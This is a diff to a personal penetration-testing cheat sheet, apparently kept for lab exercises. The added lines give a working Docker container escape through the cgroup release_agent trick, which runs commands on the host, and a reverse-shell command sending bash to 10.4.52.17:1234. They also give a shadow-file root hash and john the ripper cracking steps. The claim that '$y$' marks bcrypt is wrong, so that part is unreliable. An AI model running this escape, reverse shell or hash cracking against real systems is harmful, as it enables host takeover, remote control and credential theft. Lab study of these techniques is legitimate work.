@@ -6,6 +6,34 @@ Transfer or Receive files with scp (if key algorithm is needed, add it)(always n
 #scp user@10.10.7.24:/home/user/.bash_history /home/peter
 #scp -i /path/to/id_rsa example.txt user@192.168.1.100:/home/user/documents/ (scp with id_rsa)
 
+Docker privilege escalation
+----------------------------
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+ 
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+ 
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+ 
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+echo '#!/bin/sh' > /cmd
+
+echo "bash -i >& /dev/tcp/10.4.52.17/1234 0>&1"
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+Bruteforcing bcrypt with john the ripper (root password)
+---------------------------------------------------------
+root:$y$j9T$.9s2wZRY3hcP/udKIFher1$sIBIYsiMmFlXhKOO4ZDJDXo54byuq7a4xAD0k9jw2m4:18885:0:99999:7:::
+
+transform into hash and use john. $y$ is bcrypt.
+
+john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt  (instead of bcrypt use crypt)
+
+
 Rustscan
 --------
 #rustscan -r 1-1000 -a 10.10.229.240 -- -sV -sC -oN scan
@@ -313,6 +341,10 @@ cewl -w list.txt -d 5 -m 5 http://thm.labs
 -w: will write the contents into a file
 -m 5 :take strings that are more than 5 characters
 -d 5 :depth level of crawling
+
+Use tr command to convert uppercase to lowercase (after creating wordlist).
+-------------------------------------------------
+tr '[:upper:]' '[:lower:]' < wordlist.txt > lowercase.txt
 
 2.172.20.0.16
 
